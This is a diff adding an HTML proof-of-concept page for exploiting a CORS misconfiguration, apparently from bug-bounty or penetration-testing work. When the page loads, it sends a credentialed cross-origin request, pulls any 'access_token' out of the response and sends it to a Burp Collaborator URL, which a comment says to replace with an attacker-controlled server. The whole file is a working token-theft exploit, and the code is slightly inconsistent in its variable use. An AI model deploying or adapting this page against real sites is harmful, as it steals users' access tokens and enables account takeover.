@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+
+<html>
+<body>
+<center><h2>CORS PoC</h2>
+<div id="demo">
+<button type="button" onclick="loadDoc()">Exploit</button>
+</div></center>
+<center><p id="lola"></p></center>
+<script>
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("lola").innerHTML = this.responseText;
+myFunction(this);
+}
+};
+  xhttp.open("GET", "https://vihj0cv68poclit4inpukir1bshj58.burpcollaborator.net", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+
+
+
+function myFunction(xhttp) {
+var xhttp1;
+xhttp1=new XMLHttpRequest();
+xhttp1.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+1
+}
+};
+var content = xhttp.responseText;
+var n = content.indexOf("access_token")
+//Change the url here to attacker controlled server
+url = "https://e7m2pvkpx8dva1in76ed91gk0b63us.burpcollaborator.net/?" + content.substring(n,);
+xhttp.open("GET", url, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+
+</html>
